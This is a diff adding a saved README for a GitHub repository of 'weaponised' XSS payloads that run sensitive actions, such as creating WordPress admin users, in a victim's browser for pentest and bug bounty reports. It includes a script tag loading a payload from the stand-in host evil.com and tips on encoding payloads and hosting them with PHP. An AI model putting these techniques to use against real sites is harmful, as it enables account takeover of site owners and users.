@@ -1,0 +1,55 @@
+---
+repo: hakluke/weaponised-XSS-payloads
+url: 'https://github.com/hakluke/weaponised-XSS-payloads'
+homepage: null
+starredAt: '2020-12-17T04:35:25Z'
+createdAt: '2019-05-19T13:57:39Z'
+updatedAt: '2025-02-22T18:36:59Z'
+language: JavaScript
+license: NA
+branch: master
+stars: 1350
+isPublic: true
+isTemplate: false
+isArchived: false
+isFork: false
+hasReadMe: true
+refreshedAt: '2025-02-25T21:18:16.127Z'
+description: XSS payloads designed to turn alert(1) into P1
+tags: []
+---
+
+# Weaponised XSS Payloads
+_XSS payloads designed to turn alert(1) into P1._
+
+## The Blog Post
+This repo was released alongside a blogpost titled "How to Upgrade Your XSS Bugs from Medium to Critical" https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4
+
+## What is this?
+
+In this repository you will find a bunch of JavaScript files which can be loaded into an XSS payload in order to perform sensitive functions on popular CMS platforms in the context of the victim's browser. This can help to chain a plain old XSS bug into something more critical, like an account takeover.
+
+This is perfect for beefing up the severity of a pentest or bug bounty report by demonstrating real security impact.
+
+Payloads are slowly being added either as I have time. There are plenty more to come, if you can help out - pull requests are welcome! If you're looking for inspiration on what to create - check the "issues" tab on this repo.
+
+## How To
+
+The simplest way to use these payloads is to host them somewhere and load them into the src attribute of a script tag for your XSS payload like this:
+
+```
+<script src="http://evil.com/wordpress_create_admin_user.js"></script>
+```
+
+Alternatively, depending on the context and length of the payload, it can sometimes be [minified](https://javascript-minifier.com/), [encoded](https://eve.gd/2007/05/23/string-fromcharcode-encoder/) and then just included directly into the request.
+
+In order to host the JavaScript file, you may need to set the Content-Type to `application/javascript`. To achieve this with PHP, you can simply prepend this line to the top of any of the payloads, save it as a .php file and host it on your PHP-enabled webserver:
+
+```
+<?php header("Content-Type: application/javascript"); ?>
+```
+
+
+## Credits
+
+[This article](https://www.shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) from Shift8 is what inspired me to make this repo. The JS in the article has a couple of minor typos but the concepts are spot on.
